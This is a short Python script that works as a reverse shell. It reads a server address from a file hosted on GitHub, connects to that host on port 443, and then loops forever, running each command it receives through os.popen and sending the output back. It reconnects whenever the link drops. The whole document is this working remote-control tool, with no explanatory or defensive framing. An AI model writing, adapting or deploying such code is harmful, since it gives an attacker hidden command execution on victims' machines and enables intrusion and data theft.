import base64
import urllib.request
import os
import socket
import time

def get_ip():
    try:
        page = urllib.request.urlopen("https://raw.githubusercontent.com/WarrenHood/remote/master/conn.txt")
        content = str(page.read().decode()).strip()
    except:
        return "NOT_FOUND"
    return content

def get_connection():
    connected = False
    while not connected:
        try:
            server_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            server_ip = get_ip()
            print("Connecting to ip:",server_ip)
            while server_ip == "NOT_FOUND":
                server_ip = get_ip()
                time.sleep(1)
            server_sock.connect((server_ip,443))
            connected = True
        except:
            print("Could not connect!")
            connected = False
            time.sleep(1)
        if connected:
            return server_sock
server = get_connection()
while True:
    try:
        command = str(server.recv(2048).decode())
        #print(command)
        server.send(os.popen(command).read().encode())
    except:
        server = get_connection()

